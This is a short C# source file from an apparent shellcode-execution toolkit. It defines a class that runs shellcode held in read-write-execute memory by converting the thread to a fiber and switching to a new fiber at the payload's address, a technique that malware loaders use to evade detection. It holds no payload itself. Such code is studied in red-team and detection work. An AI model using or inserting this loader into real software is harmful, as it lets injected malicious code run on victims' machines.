using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
namespace ShellCodeExecutor
{
    internal class FiberShellCodeRunner : IShellCodeRunner
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr ConvertThreadToFiber(IntPtr lpParameter);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateFiber(uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);
        [DllImport("kernel32.dll")]
        static extern void SwitchToFiber(IntPtr fiber);
        public void RunShellCode(IntPtr rwxMemory)
        {
            IntPtr fiberAddress = ConvertThreadToFiber(IntPtr.Zero);
            IntPtr shellCodeFiber = CreateFiber(0, rwxMemory, IntPtr.Zero);
            SwitchToFiber(shellCodeFiber);
        }
        
        override
            public String ToString()
        {
            return "Fiber";
        }
    }
}
